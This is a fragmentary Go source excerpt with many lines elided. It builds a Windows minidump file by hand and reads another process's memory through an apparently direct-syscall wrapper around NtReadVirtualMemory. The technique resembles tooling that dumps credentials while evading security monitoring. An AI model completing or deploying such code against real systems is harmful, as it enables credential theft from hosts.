...
func get_dump_bytearr(osInfo []OSInformation, moduleinfo_arr []ModuleInformation, mem64list_arr []Mem64Information, memoryRegions_byte_arr []byte) []byte {
	...
	for len(systeminfostream) < 56 {
		systeminfostream = append(systeminfostream, 0x00)
	}
	...
	for i := 0; i < len(moduleinfo_arr); i++ {
		...
		for i := 0; i < 80; i++ {
			modulelist_stream = append(modulelist_stream, 0x00)
		}
	}
	for i := 0; i < len(moduleinfo_arr); i++ {
...
func procdump_native(pid int) ([]byte, error) {
	...
	for mem_address < proc_max_address_l {
		...
		if memInfo.Protect != PAGE_NOACCESS && memInfo.State == MEM_COMMIT {
			...
			var bytesRead uintptr
			superdeye.SuperdSyscall("NtReadVirtualMemory", proc_handle, memInfo.BaseAddress, uintptr(unsafe.Pointer(&buffer[0])), memInfo.RegionSize, uintptr(unsafe.Pointer(&bytesRead)))
